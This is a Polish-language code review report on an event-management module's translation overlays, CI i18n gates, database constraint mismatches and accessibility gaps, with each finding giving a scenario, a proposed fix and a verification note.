> Modul niesie 12 wlasnych nakladek i18n (`i18n-admin-events`, `i18n-admin-event-{agenda,meetings,onsite,registration,sessions,sponsors,terms}`, `i18n-event-{front,meetings,registration,scanner}`) - lacznie ok. 3800 kluczy PL z pelnym lustrem EN; parytet PL/EN i repo-wide bramka rozjazdu kod<->slownik sa zielone, a skan gotych literali-kluczy w `src/lib/events` nie wykazal ani jednego klucza spoza slownika. Warstwa jakosci jest solidna tam, gdzie ma wlasna bramke: wszystkie 46 dialogow maja `DialogTitle`, zaden przycisk ikonowy nie jest bez nazwy dostepnej, statusy ida przez warianty `Badge` (nie przez sam kolor), a 41 z 44 paneli studia ma komplet stanow ladowania/bledu/pustki przez wspolny `AdminCatalogListState`. Realne dziury leza tam, gdzie bramka istnieje tylko z nazwy: `check:i18n-overlay-imports` nie widzi ZADNEJ z 12 nakladek modulu (jej parser wymaga `const pl =`, a moduł nazywa drzewa `adminEventsPl` itd.), przez co 65 plikow modulu wola klucze nakladki, ktorej nie importuje; ta sama bramka jest dzis CZERWONA na 5 swiezych plikach modulu. Bramka modulowa deklaruje zero […]

### [wysoki] Bramka `check:i18n-overlay-imports` jest dzis CZERWONA - 5 z 6 zglaszanych plikow to powierzchnia wydarzen

`src/components/events/participant/molecules/EventPersonActions.tsx:64` · niespojnosc · weryfikacja: POTWIERDZONE

Uruchomienie `bun run check:i18n-overlay-imports` konczy sie kodem 1 z lista 6 plikow, z czego 5 nalezy do modulu: `src/components/admin/events/studio/PreviewMePanel.tsx` (34 klucze `eventMe.*`), `src/components/events/participant/molecules/EventPersonActions.tsx`, `MyAgendaList.tsx`, `MyEventProfileForm.tsx` (44 klucze), `MyEventPublicPreview.tsx`, `OrganizationPicker.tsx` (27 kluczy). Wszystkie wolaja galaz `eventMe.*`, ktora mieszka w `src/lib/i18n-cart.ts:55` - i zadnego z tych plikow nie ma w `scripts/lib/i18nOverlayImportBaseline.ts` (baseline nie zawiera ani jednej pozycji z `components/events` ani `components/admin/events`). Zaden z plikow nie nosi tez dyrektywy `// i18n-overlay-imports: pomijamy ...`. Pliki sa swieze - ostatni commit dotykajacy `EventPersonActions.tsx` to „Work in progress" z 2026-08-28. Ironia sytuacji: bramka lapie te pliki tylko dlatego, ze ich klucze siedza w `i18n-cart.ts`, ktory JAKO JEDYNY z uzywanych tu slownikow deklaruje `const pl` (linia 5) - gdyby […]

**Scenariusz.** CI na obecnym HEAD oblewa krok `check:i18n-overlay-imports` (exit 1). Dopoki nikt tego nie naprawi, kazde nastepne uruchomienie tej bramki jest czerwone z tego samego powodu, wiec przestaje niesc informacje o nowych regresjach - a to jedyna bramka w repo, ktora widzi klasę „ekran renderuje goly klucz i18n".

**Naprawa.** Dopisac `import "@/lib/i18n-cart";` (albo `import { ensureI18n } from "@/lib/i18n-cart"` z wywolaniem, jak robi to `src/components/events/participant/organisms/EventMePanel.tsx:36`) w kazdym z 5 plikow modulu; alternatywnie wydzielic galaz `eventMe.*` z `i18n-cart.ts` do wlasnej nakladki panelu uczestnika i zaimportowac ja wprost.

**Weryfikacja.** Uruchomilem `bun run check:i18n-overlay-imports` na HEAD: exit 1, dokladnie 6 plikow, wszystkie z prosba `dopisz: import "@/lib/i18n-cart"` - PreviewMePanel.tsx, EventPersonActions.tsx, MyAgendaList.tsx, MyEventProfileForm.tsx, MyEventPublicPreview.tsx, OrganizationPicker.tsx. Uscislenie: to 6 z 6 plikow modulu wydarzen (PreviewMePanel tez lezy w src/components/admin/events/studio), nie 5 z 6. Baseline […]

### [wysoki] Bramka `check:i18n-overlay-imports` nie widzi zadnej z 12 nakladek modulu wydarzen

`src/lib/ci/i18nOverlayImports.ts:147` · ryzyko · weryfikacja: POTWIERDZONE

`keysOf()` wyciaga klucze nakladki jednym wzorcem: `const match = /\bconst\s+pl\s*(?::[^=]*)?=\s*/.exec(masked);` - czyli rozpoznaje WYLACZNIE nakladki nazywajace drzewo PL doslownie `pl`. Wszystkie nakladki wydarzen nazywaja je inaczej (`src/lib/i18n-admin-events.ts:24` `export const adminEventsPl = {`, `src/lib/i18n-event-meetings.ts:19` `export const eventMeetingsPl = {`, analogicznie pozostale dziesiec). Dla nich `keysOf()` zwraca `[]`, a `collectOverlays()` (linia 152: `.filter((o) => o.keys.length > 0)`) usuwa je z listy nakladek - wiec bramka nie zna ANI JEDNEGO klucza modulu i nie ma czego sprawdzic. Pomiar: 54 z 118 nakladek repo jest w ten sposob niewidocznych, w tym komplet nakladek wydarzen. Skutek policzalny: 65 plikow modulu wola klucze swojej nakladki bez importu wprost (m.in. `src/components/admin/events/organisms/EventTrackWorkspace.tsx` - 90 kluczy `adminEventAgenda.*`, `MeetingSettingsPanel.tsx` - 49 kluczy `adminEventMeetings.*`, […]

**Scenariusz.** Ktos przenosi `MeetingSettingsPanel` z trasy studia (dzis wciaga nakladke przez `EventStudioModuleSections.tsx:202` `ensureMeetingsI18n()`) do innego kontenera - np. dodaje szybki podglad ustawien gieldy w `EventOverviewPanel`. Nakladka `i18n-admin-event-meetings` nie trafia do tego chunka, i18next nie zna zadnego z 49 kluczy, a panel renderuje uzytkownikowi `adminEventMeetings.settings.loading`, […]

**Naprawa.** Rozszerzyc wzorzec w `keysOf()` na dowolna nazwe drzewa PL, np. `/\b(?:export\s+)?const\s+[A-Za-z_$][\w$]*[Pp]l\s*(?::[^=]*)?=\s*/` (albo czytac argument pierwszego `i18n.addResourceBundle("pl", ...)`), dodac do `src/lib/ci/__tests__` kanarek na nakladce nazywajacej drzewo inaczej niz `pl`, przeliczyc baseline (`--print-baseline`) i dopisac import wprost w plikach modulu, ktore wyjda ponad nowy baseline.

**Weryfikacja.** src/lib/ci/i18nOverlayImports.ts:145-149: keysOf() dopasowuje /\bconst\s+pl\s*(?::[^=]_)?=\s_/ i zwraca [] gdy brak trafienia; collectOverlays (linia 152-156) odfiltrowuje nakladki z .filter((o) => o.keys.length > 0). Sprawdzilem naglowki wszystkich nakladek wydarzen - zadna nie ma `const pl`: i18n-admin-events.ts:24 adminEventsPl, i18n-event-meetings.ts:19 eventMeetingsPl, i18n-admin-event-agenda.ts:18, […]

### [wysoki] Dropdown odbiorcy pakietu oferuje 3 wartosci, ktorych CHECK bazy nie dopuszcza

`src/lib/events/packagesApi.ts:25` · blad · weryfikacja: POTWIERDZONE

`export const PACKAGE_AUDIENCES = ["company", "university", "delegation", "partner"] as const;` z komentarzem „Odbiorca pakietu - odwzorowanie CHECK-a `audience` jeden do jednego". Ograniczenie w bazie brzmi inaczej: `supabase/migrations/20260824080000_event_admissions_packages_coupons.sql:268-269` -> `CONSTRAINT event_ticket_packages_audience_values CHECK (audience IN ('public', 'member', 'academic', 'ngo', 'company'))`. Czesc wspolna to JEDNA wartosc: `company`. Dialog renderuje ten zbior wprost (`src/components/admin/events/molecules/EventPackageDialog.tsx:128` `options={PACKAGE_AUDIENCES}`), a RPC wpisuje wartosc bez walidacji (`supabase/migrations/20260827221214_14a3d2bb-aa5d-48d3-bb31-34aff2c14dc5.sql:117` `audience = COALESCE(NULLIF(p_payload->>'audience',''), p.audience)` i :160 przy wstawianiu). Rozjazd ma drugi koniec: `src/lib/events/packageDraft.ts:94-96` sprowadza kazda wartosc spoza tej czworki do `"company"`, wiec pakiet zapisany w bazie jako `academic` po wejsciu w […]

**Scenariusz.** Organizator otwiera Zapisy > Pakiety > Nowy pakiet, w polu „Odbiorca" wybiera „Uczelnia" (`university`) i zapisuje. `admin_event_package_upsert` wstawia `audience = 'university'`, Postgres odrzuca to naruszeniem `event_ticket_packages_audience_values` (SQLSTATE 23514). Glowa komunikatu nie jest kluczem technicznym, wiec `adminRegistrationFailure` degraduje ja do `adminEventRegistration.errors.unknown` i organizator […]

**Naprawa.** Przepisac `PACKAGE_AUDIENCES` z ograniczenia: `["public", "member", "academic", "ngo", "company"]`, uzupelnic galaz `adminEventRegistration.packages.audiences.*` w obu jezykach o `public`, `member`, `academic`, `ngo` (i usunac university/delegation/partner albo dopisac je do CHECK-a, jesli to one sa zamierzonym modelem), zdjac `defaultValue` z wywolania w EventPackagesPanel.tsx:169 oraz dodac w RPC jawne `RAISE […]

**Weryfikacja.** Sprawdzilem oba konce. src/lib/events/packagesApi.ts:25 deklaruje PACKAGE_AUDIENCES = [company, university, delegation, partner] z komentarzem o odwzorowaniu CHECK-a 1:1. Realny CHECK: supabase/migrations/20260824080000_event_admissions_packages_coupons.sql:268-269 -> audience IN ('public','member','academic','ngo','company'); powtorzony identycznie w 20260825191948_ab7f57aa...sql:180-181 i ZADNA pozniejsza migracja […]

### [średni] 16 wywolan `t(klucz_dynamiczny, { defaultValue: <kolumna z bazy> })` omija bramke, ktora deklaruje wobec nich zero tolerancji

`src/components/admin/events/organisms/OnsiteBadgesPanel.tsx:127` · i18n · weryfikacja: POTWIERDZONE

`{`${t(`adminEventOnsite.paperFormats.${row.paper_format}`, { defaultValue: row.paper_format })} · ${t(`adminEventOnsite.orientations.${row.orientation}`, { defaultValue: row.orientation })}`}`. Bramka modulowa ma osobny test „zadne wywolanie t() w wydarzeniach nie polega na defaultValue" (`src/components/admin/events/**tests**/eventsI18nKeys.gate.test.ts:139`) z uzasadnieniem: „uzytkownik dostaje surowa wartosc z bazy - po angielsku, w polskim interfejsie". Test jest wobec tych wywolan pusty, bo `src/lib/ci/i18nKeyUsage.ts:322-330` `readDefaultValue()`dopasowuje`/defaultValue\s*:\s*(["'`])((?:[^\\]|\\.)*?)\1/` - czyli WYLACZNIE literal w cudzyslowie. `defaultValue: row.paper_format` jest wyrazeniem, wiec zwraca `null` i bramka przechodzi. Wystapien w powierzchni modulu jest 16: OnsiteBadgesPanel.tsx:128,130; OnsiteCheckpointsPanel.tsx:159,161,169; OnsiteLogPanel.tsx:173,177,181; OnsiteDeskPanel.tsx:84,161,166; OnsiteDevicesPanel.tsx:187,191; ScannerDeviceDialog.tsx:283; […]

**Scenariusz.** Baza dostaje nowa wartosc slownikowa - np. migracja rozszerza `event_checkins_result_values` o `denied_expired`. Nikt nie dopisuje jej do `adminEventOnsite.results`. Panel dziennika odpraw renderuje plakietke z napisem `denied_expired` po angielsku, w polskim interfejsie, dokladnie tak jak wczesniejszy incydent opisany w naglowku `src/lib/events/onsiteEnums.ts:10-17`. Bramka modulowa, parytet PL/EN i […]

**Naprawa.** Albo rozszerzyc `readDefaultValue()` o wykrywanie NIE-literalowego `defaultValue` (osobna klasa `runtime`, zliczana w ratchecie), albo - lepiej - zdjac `defaultValue` z tych 16 wywolan i zastapic je jawna mapa `Record<Enum, string>` z `onsiteEnums.ts`, ktora bramka juz umie sprawdzic jako `prefix` (porownanie ZBIOROW podkluczy PL i EN, patrz `normalizeBranchReferences` w gate.test.ts:110).

**Weryfikacja.** Mechanizm potwierdzony: src/lib/ci/i18nKeyUsage.ts:322-330 readDefaultValue() probuje unquote(second) (literal pozycyjny), a potem /defaultValue\s*:\s*(["'`])((?:[^\\]|\\.)*?)\1/ - wyrazenie `row.paper_format` nie pasuje do zadnej z tych form, wiec zwraca null. Test src/components/admin/events/**tests**/eventsI18nKeys.gate.test.ts:153-159 filtruje po u.defaultValue !== null, wiec te wywolania sa dla niego […]

### [średni] Dwie nakladki walcza o korzen `eventMeetings` - tresc dwoch kluczy zalezy od kolejnosci ewaluacji modulow

`src/lib/i18n-admin-event-meetings.ts:244` · niespojnosc · weryfikacja: POTWIERDZONE

`src/lib/i18n-admin-event-meetings.ts` rejestruje DWA korzenie: `adminEventMeetings` (panel) i `eventMeetings` (uczestnik, linia 39). Ten drugi korzen ma jednak wlasna nakladke: `src/lib/i18n-event-meetings.ts:20` rowniez otwiera `eventMeetings`. Oba pliki wolaja `i18n.addResourceBundle(..., true, true)` (deep merge + overwrite), wiec przy kolizji wygrywa modul zaewaluowany POZNIEJ. Porownanie drzew: 447 kluczy w nakladce panelu, 184 w nakladce frontu, czesc wspolna to 3 klucze - `eventMeetings.errors.forbidden` (linia 244 „Ta operacja wymaga zalogowania." vs `i18n-event-meetings.ts:231` „Zaloguj się, żeby korzystać z giełdy spotkań."), `eventMeetings.errors.unknown` („Nie udało się wykonać tej operacji. Spróbuj ponownie." vs „Operacja się nie powiodła. Spróbuj ponownie.") oraz jeden klucz identyczny. Poza tym oba slowniki opisuja te same pojecia ROZNYMI kluczami: `eventMeetings.statuses.*` (panel) vs `eventMeetings.status.*` (front), `eventMeetings.sides.*` vs `eventMeetings.side.*`, […]

**Scenariusz.** Uczestnik bez sesji otwiera `/meetings/<slug>`. Trasa wciaga `i18n-event-meetings` (przez `ParticipantDirectoryPanel.tsx:46`). Jesli w tym samym chunku znajdzie sie tez `i18n-admin-event-meetings` - a znajdzie sie wszedzie, gdzie obok stoi cokolwiek ze studia albo `EventAnalyticsPanel.tsx:41` - i zaewaluuje sie po nim, `meetingErrorI18nKey(error)` zwroci `eventMeetings.errors.forbidden`, a uczestnik zobaczy panelowe […]

**Naprawa.** Rozdzielic wlasnosc korzeni: `i18n-admin-event-meetings.ts` zostawia sobie WYLACZNIE `adminEventMeetings.*`, a wszystko pod `eventMeetings.*` (statusy, strony, etykiety, komunikaty uczestnika) przenosi sie do `i18n-event-meetings.ts` - z ujednoliceniem `statuses`/`status` i `sides`/`side` do jednej nazwy. Panel, ktory potrzebuje etykiety stanu, importuje wtedy obie nakladki jawnie. Po scaleniu usunac martwe galezie […]

**Weryfikacja.** Kolizja realna. src/lib/i18n-admin-event-meetings.ts:40 otwiera korzen eventMeetings (a nie tylko adminEventMeetings) i rejestruje go deep-merge z nadpisaniem: linie 1247-1248 addResourceBundle(..., true, true). src/lib/i18n-event-meetings.ts:19-20 otwiera ten sam korzen i rejestruje tak samo (528-529). Kolidujace liscie sprawdzilem po tekscie: eventMeetings.errors.forbidden = "Ta operacja wymaga zalogowania." […]

### [średni] Formularz profilu uczestnika: trzy `<label>` bez powiazania z polem tekstowym

`src/components/events/participant/molecules/MyEventProfileForm.tsx:414` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

`<label className="text-xs font-semibold uppercase tracking-wide text-muted-foreground">{en ? t("eventMe.fields.bioEn") : t("eventMe.fields.bioPl")}</label>` stoi jako RODZENSTWO `<Textarea rows={4} ... />` (linia 417) - bez `htmlFor` po stronie etykiety i bez `id` po stronie kontrolki, wiec zadne powiazanie nie powstaje. Ten sam ksztalt powtarza sie w liniach 427-434 (`eventMe.fields.seeking`) i 439-446 (`eventMe.fields.offering`). Plik zna poprawny wzorzec i uzywa go dziesiec linii nizej: `<label htmlFor="event-profile-push-account" ...>` (linia 459). Analogiczne braki w panelu: `src/components/admin/events/organisms/ArrangeMeetingDialog.tsx:72,85,199` - `<Label>{props.label}</Label>` nad `<Input>` bez `id` (linia 86), oraz `EventPageCreateDialog.tsx:168` i `EventImageDropzone.tsx:83`. Dla porownania, publiczny formularz zapisu robi to wzorcowo: `RegistrationAnswerField.tsx:79-85` uzywa `useId()` z `htmlFor`/`id`, a przy `Select` podaje `aria-label` na `SelectTrigger` (linia 99).

**Scenariusz.** Uczestnik korzystajacy z czytnika ekranu wchodzi na `/events/<slug>/me`, zakladka „Moj profil", i przechodzi Tabem do sekcji „O mnie". Czytnik oglasza trzy kolejne pola jako „edit text, blank" - bez nazwy, bo napis obok nie jest z nimi zwiazany ani przez `htmlFor`, ani przez zawijanie. Uczestnik nie wie, ktore pole to biogram, ktore „czego szukam", a ktore „co oferuje", i nie moze wypelnic profilu, od ktorego zalezy […]

**Naprawa.** Nadac kazdemu polu `id` z `useId()` i dopiac etykiete przez `htmlFor` - dokladnie jak `RegistrationAnswerField.tsx:79-85` i jak linia 459 tego samego pliku. To samo w `ArrangeMeetingDialog.tsx` (`<Label htmlFor={id}>` + `<Input id={id}>`), `EventPageCreateDialog.tsx:168` i `EventImageDropzone.tsx:83`.

**Weryfikacja.** src/components/events/participant/molecules/MyEventProfileForm.tsx:414-417: <label className="text-xs ...">{en ? t("eventMe.fields.bioEn") : t("eventMe.fields.bioPl")}</label> a zaraz pod nim <Textarea rows={4} ...> - ani htmlFor, ani id, ani zawijania kontrolki w etykiete. Identycznie w 427-434 (eventMe.fields.seeking) i 439-446 (eventMe.fields.offering). Poprawny wzorzec stoi w tym samym pliku dziesiec linii […]

### [średni] Panel Analityki i Pulpit czytaja po cztery zapytania i nie obsluguja ani bledu, ani ladowania

`src/components/admin/events/organisms/EventAnalyticsPanel.tsx:60` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

Panel pobiera cztery niezalezne zrodla: `countsQ = useRegistrationCounts(...)` (linia 60), `sessionsQ = useEventSessions(...)` (68), `meetingsQ = useMeetingStats(eventId)` (69), `onsiteQ = useOnsiteStats(eventId, 60)` (72). W calym pliku nie ma ani jednego odwolania do `.error`, `.isError` ani `.isLoading` - jedyne, co jest czytane, to `.data` (`const counts = countsQ.data ?? null;` linia 74 i siostrzane 75-76). Wartosc `null` idzie do `<Metric value={null} />`, a `Metric` (linia 202-207) renderuje wtedy `"—"`. Ten sam wzorzec ma `src/components/admin/events/organisms/EventOverviewPanel.tsx:54-64` (cztery zapytania: `useRegistrationCounts`, `useEventSessions`, `useEventGroups`, `useSponsors`, zero obslugi bledu). To dwa z 44 organizmow studia - pozostale 41 uzywaja wspolnego `AdminCatalogListState` z jawnym `isLoading`, `errorMessage` i `isEmpty` (wzorzec: `OnsiteBadgesPanel.tsx:107-115`).

**Scenariusz.** RPC `admin_event_onsite_stats` odmawia (odebrane uprawnienie, blad sieci, wygasla sesja). `onsiteQ.error` jest ustawione, `onsiteQ.data` jest `undefined`. Panel Analityki rysuje komplet kafelkow on-site z kreska „—" - identycznie jak dla wydarzenia, w ktorym po prostu nikt jeszcze nie przeszedl przez bramke, i identycznie jak w trakcie ladowania. Organizator patrzy na ekran po zakonczonej konferencji i odczytuje […]

**Naprawa.** Zawinac oba panele w ten sam wzorzec, co reszta studia: pokazac szkielet przy `isLoading` i zdanie z `adminOnsiteErrorMessage`/`adminRegistrationErrorMessage` przy `.error` (kazde zrodlo osobno, zeby awaria jednego RPC nie kasowala trzech pozostalych sekcji), a `"—"` zostawic wylacznie dla realnego braku danych.

**Weryfikacja.** src/components/admin/events/organisms/EventAnalyticsPanel.tsx:59-76: cztery zapytania (countsQ:59, sessionsQ:67, meetingsQ:68, onsiteQ:71) i tylko odczyt .data z fallbackiem null (74-76). rg po 'isError|\.error|isLoading|isPending' w tym pliku zwraca ZERO trafien. Metric (linie ~195-212) renderuje '—' dla null, wiec blad, ladowanie i realne zero wygladaja identycznie. To samo w […]

### [średni] Pelnoekranowy podglad studia to reczny `role="dialog"` bez aria-modal, focus trapa i przywrocenia fokusu

`src/components/admin/events/studio/EventStudioPreview.tsx:236` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

`<div role="dialog" aria-label={t("adminEvents.studio.preview.title")} className="fixed inset-0 z-50 flex flex-col bg-neutral-900">`. Plik NIE importuje `@/components/ui/dialog` - to jedyne okno modalne w calym module zbudowane recznie (pozostale 46 powierzchni z `DialogContent` ida przez Radix). Braki wzgledem tego, co Radix daje za darmo: nie ma `aria-modal="true"`; nie ma zadnego `tabIndex`, `.focus()` ani `useRef` na kontener (jedyne refy w pliku to `frameRef`/`canvasRef` do pomiaru skali, linie 199-200), wiec po otwarciu fokus zostaje na przycisku POD nakladka; nie ma przywrocenia fokusu przy zamknieciu; nie ma `inert`/`aria-hidden` na tresci studia pod spodem, wiec czytnik ekranu i Tab nadal chodza po calym panelu za nakladka. Zaimplementowana jest wylacznie obsluga Escape (linie 222-230) - i jej komentarz pokazuje, ze o dostepnosc zadbano swiadomie, tylko czesciowo.

**Scenariusz.** Redaktor korzystajacy z klawiatury klika „Podglad" w pasku studia. Nakladka zakrywa ekran, ale fokus zostaje na przycisku „Podglad" pod spodem. Pierwszy Tab przenosi go na kolejny element SIDEBARA STUDIA - niewidocznego, bo przykrytego - i redaktor nawiguje po interfejsie, ktorego nie widzi, nie mogac dojsc do przelacznika desktop/mobile ani do przycisku „Zamknij" w nakladce. Uzytkownik czytnika ekranu slyszy przy […]

**Naprawa.** Przepisac nakladke na `Dialog`/`DialogContent` z `@/components/ui/dialog` (Radix zalatwia aria-modal, focus trap, przywrocenie fokusu, `aria-hidden` na tle i Escape, wiec reczny `useEffect` z linii 222-230 mozna usunac), zachowujac obecne klasy pelnoekranowe. Jesli Radix koliduje z pomiarem skali kanwy, minimum to: `aria-modal="true"`, `tabIndex={-1}` + `.focus()` na kontenerze po otwarciu, zapamietanie i […]

**Weryfikacja.** src/components/admin/events/studio/EventStudioPreview.tsx:233-237: <div role="dialog" aria-label={t("adminEvents.studio.preview.title")} className="fixed inset-0 z-50 ...">. rg po 'aria-modal|tabIndex|\.focus\(|inert|aria-hidden|useRef' w tym pliku: aria-hidden wystepuje wylacznie na ikonach (252, 258, 272, 284), refy to lastDocumentRef:109, frameRef:199, canvasRef:200 (pomiar skali), a aria-modal, tabIndex, […]

### [niski] Cala nakladka `i18n-admin-event-sessions.ts` jest martwa - 367 kluczy w obu jezykach bez ani jednego odwolania

`src/lib/i18n-admin-event-sessions.ts:27` · niespojnosc · weryfikacja: POTWIERDZONE

Plik ma 1131 linii i eksportuje `adminEventSessionsPl` (linia 27) oraz `adminEventSessionsEn` (linia 574) z dwoma korzeniami: `eventSessions` (linia 28) i `adminEventSessions` (linia 132). Wyszukiwanie po calym `src` z wylaczeniem samego pliku (`rg 'i18n-admin-event-sessions|adminEventSessions|eventSessions\.'`) nie zwraca ANI JEDNEGO trafienia - zaden modul go nie importuje, zaden klucz nie jest wolany. Rownolegle istnieje `src/lib/i18n-admin-event-agenda.ts` (345 kluczy, 0 martwych wg skanu), z ktorego panel sesji faktycznie korzysta: `src/components/admin/events/organisms/AgendaSessionsPanel.tsx` wola `adminEventAgenda.sessions.*`, `EventSessionDialog.tsx` - `adminEventAgenda.sessionDialog.*`. Oba slowniki opisuja to samo pojecie innymi kluczami (`eventSessions.formats` vs `adminEventAgenda.formats`, `eventSessions.statuses` vs `adminEventAgenda.statuses`, `eventSessions.speakerRoles` vs `adminEventAgenda.roles`); kolizji kluczy jest zero, wiec nic sie nie nadpisuje - ale i nic nie […]

**Scenariusz.** Tlumacz albo redaktor dostaje zgloszenie „w agendzie zle brzmi nazwa statusu sesji". Wyszukuje w repo `statuses` w slownikach wydarzen, trafia najpierw na `i18n-admin-event-sessions.ts` (nazwa pliku pasuje do pojecia „sesje" doslowniej niz „agenda"), poprawia oba jezyki, commituje. Parytet PL/EN przechodzi, bramka rozjazdu przechodzi, panel po wdrozeniu wyglada dokladnie tak samo - poprawka wyladowala w pliku, […]

**Naprawa.** Usunac `src/lib/i18n-admin-event-sessions.ts` w calosci (nic go nie importuje, wiec usuniecie jest bezstratne) albo - jesli byl planowany jako slownik przyszlego, osobnego ekranu sesji - opisac to w naglowku pliku i dodac go do jawnej listy wyjatkow, zeby kolejny przeglad nie zaczynal od tego samego pytania.

**Weryfikacja.** rg 'i18n-admin-event-sessions|adminEventSessions|eventSessions\.' po calym src z wykluczeniem samego pliku: zero trafien; powtorzone rg 'i18n-admin-event-sessions' po calym repo: rowniez zero. Plik ma 1131 linii, eksportuje adminEventSessionsPl (linia 27, korzenie eventSessions:28 i adminEventSessions:132) i adminEventSessionsEn (574). Sprawdzilem tez, czy nie wciaga go loader globem - […]

### [niski] Mapy odmow nie pokrywaja kompletu kodow rzucanych przez migracje - edytor identyfikatorow i pakiety odpowiadaja komunikatem ogolnym

`supabase/migrations/20260823180000_event_onsite.sql:3804` · luka-funkcjonalna · weryfikacja: PRAWDOPODOBNE

Porownanie kompletu `RAISE EXCEPTION '<klucz>: ...'` z migracji `event_*` przeciwko wszystkim osmiu mapom (`adminOnsiteErrors`, `adminAgendaErrors`, `adminSponsorErrors`, `adminMeetingErrors`, `adminRegistrationErrors`, `adminTermsErrors`, `adminEventStudioErrors`, `meetingsErrors`) daje liste kodow, ktorych ZADNA mapa nie zna. Najwazniejsze: (a) osiem kodow edytora ukladu identyfikatora - `invalid_element` (linia 3804), `invalid_element_kind` (3809), `invalid_element_field` (3816), `invalid_element_text` (3820), `invalid_element_url` (3824), `invalid_element_font_size` (3829), `invalid_element_width` (3834), `invalid_element_align` (3839); slownik `adminEventOnsite.errors` ma 42 zdania i ani jednego `invalidElement*`; (b) piec kodow pakietow z `20260824080000_event_admissions_packages_coupons.sql` - `sold_out` (1297), `seats_exhausted` (1300), `no_free_seat` (1428, 1508), `invalid_ticket_type` (1164), `invalid_audience` (1558); `adminEventRegistration.errors` ma 74 zdania, w tym […]

**Scenariusz.** Organizator ustawia w edytorze identyfikatora blok tekstowy o rozmiarze czcionki 120 pt. Baza odrzuca zapis komunikatem `invalid_element_font_size: the font size must be between 5 and 96 pt` - zdanie, ktore DOKLADNIE mowi, co poprawic. `adminOnsiteFailure` sprawdza `i18n.exists("adminEventOnsite.errors.invalidElementFontSize")`, dostaje `false` i zwraca `adminEventOnsite.errors.unknown`. Organizator widzi toast „Nie […]

**Naprawa.** Dopisac brakujace zdania: osiem `invalidElement*` do `adminEventOnsite.errors` (PL i EN), `soldOut`, `seatsExhausted`, `noFreeSeat`, `invalidTicketType`, `invalidAudience` do `adminEventRegistration.errors`, `tierOverCapacity` do `adminEventSponsors.errors`. Docelowo domknac to bramka: test porownujacy komplet `RAISE EXCEPTION '<klucz>:` z migracji `event_*` z kluczami galezi `*.errors.*` (analogicznie do […]

**Weryfikacja.** Braki w slownikach sa faktem, ale GLOWNY SCENARIUSZ JEST NIEOSIAGALNY. (a) Osiem kodow invalid_element* istnieje (20260823180000_event_onsite.sql:3804,3809,3816,3820,3824,3829,3834,3839) i faktycznie nie ma ich w adminEventOnsite.errors (przeczytalem cala galaz, src/lib/i18n-admin-event-onsite.ts:133-177 - sa invalidPaperFormat, tooManyElements itd., brak invalidElement*). ALE nie ma edytora ukladu w UI: […]

### [niski] Ryzyko nr 7 z par. 9 zmaterializowane: dialog prelegenta na powierzchni publicznej niesie 7 dwujezycznych ternariow

`src/components/events/SpeakerProfileDialog.tsx:193` · i18n · weryfikacja: POTWIERDZONE

Par. 9.7 specyfikacji mowi: „kazdy nowy tekst przez overlay, nigdy `isPl ? … : …`; bramka `check:i18n-hardcoded` to wylapie". W module jest jeden plik, ktory tego nie robi - i bramka go nie lapie, bo stoi w zamrozonym dlugu (`scripts/lib/i18nHardcodedBaseline.ts:77` -> `["src/components/events/SpeakerProfileDialog.tsx", 7]`). Wystapienia: linia 193 `{(lang === "pl" ? "Języki: " : "Languages: ") + ...}`, 204 `label={lang === "pl" ? "wystąpień" : "talks"}`, 216 `label={lang === "pl" ? "opinii" : "reviews"}`, 239 `{lang === "pl" ? "Wystąpienia" : "Engagements"}`, 258 `{lang === "pl" ? "Zobacz pełny profil" : "View full profile"}`, 287 `(lang === "pl" ? "Profil prelegenta" : "Speaker profile")` oraz opis dialogu w `DialogDescription` (linie 293-295). Plik jest przy tym samoswiadomy: komentarz w liniach 178-185 opisuje, ze plakietke eksperta wyjeto stad wlasnie dlatego, ze „napis byl zaszyty `lang === "pl" ? … : …`, czyli poza slownikiem" - reszta napisow zostala. To jedyny plik modulu w […]

**Scenariusz.** Dialog otwiera sie z agendy, z siatki prelegentow i z widgetu speakers na stronie publicznej wydarzenia. Siedem napisow zyje wylacznie w kodzie: nie sa w slowniku, wiec parytet PL/EN nie ma czego porownac, a poprawka literowki w jednej galezi ternary'ego nie ma jak przypomniec o drugiej. Dodanie trzeciego jezyka wymaga edycji tego pliku recznie, bo `lang: "pl" | "en"` (linia 47) nie ma dokad sie rozszerzyc. Wariant […]

**Naprawa.** Przeniesc siedem napisow do `src/lib/i18n-event-front.ts` pod galaz `eventFront.speakers.*` (nakladka jest juz w tym pliku posrednio dostepna przez `SpeakerExpertBadge`), zamienic `lang === "pl" ? … : …` na `t(...)` z propsem `lang` przekazanym do `i18n.getFixedT(lang)`, sklejenie z linii 193 zastapic kluczem z interpolacja `{{languages}}`, po czym zdjac pozycje z `i18nHardcodedBaseline.ts:77`.

**Weryfikacja.** Przeczytalem src/components/events/SpeakerProfileDialog.tsx:175-300 i widzialem wszystkie wymienione miejsca: 193 (lang === "pl" ? "Języki: " : "Languages: ") sklejane operatorem +, 204 "wystąpień"/"talks", 216 "opinii"/"reviews", 239 "Wystąpienia"/"Engagements", 258 "Zobacz pełny profil"/"View full profile", 287 "Profil prelegenta"/"Speaker profile" oraz DialogDescription 293-295. Komentarz 178-185 rzeczywiscie […]

### [niski] `adminMeetingErrors` jako jedyna z osmiu map nie rejestruje swojej nakladki przed `i18n.exists()`

`src/lib/events/adminMeetingErrors.ts:73` · ryzyko · weryfikacja: POTWIERDZONE

`export function adminMeetingFailure(error: unknown): AdminMeetingFailure {` - cialo funkcji od razu siega po `messageOf(error)` i dalej po `i18n.exists(candidate)` (linia 84), bez zadnego `ensure...I18n()`. Siostrzane mapy robia to konsekwentnie i UZASADNIAJA: `src/lib/events/adminAgendaErrors.ts:48` `ensureAgendaI18n();` z komentarzem „Bez rejestracji nakladki `i18n.exists()` odpowiada »nie ma« na kazdy klucz, wiec kazda odmowa bazy spadalaby do `unknown`"; tak samo `adminOnsiteErrors.ts:52` `ensureOnsiteI18n()`, `adminSponsorErrors.ts` `ensureSponsorsI18n()`, `adminEventStudioErrors.ts` `ensureAdminEventsI18n()`. Brak jest dzis maskowany dwoma rzeczami: trasy studia wolaja `ensureMeetingsI18n()` same (`EventStudioModuleSections.tsx:202,211,220,229`, `EventStudioSidebar.tsx:97`, `EventAnalyticsPanel.tsx:55`), a test jednostkowy `src/lib/events/__tests__/adminMeetingErrors.test.ts:9` zaczyna sie od `import "@/lib/i18n-admin-event-meetings";` - czyli sam dostarcza to, czego brakuje w […]

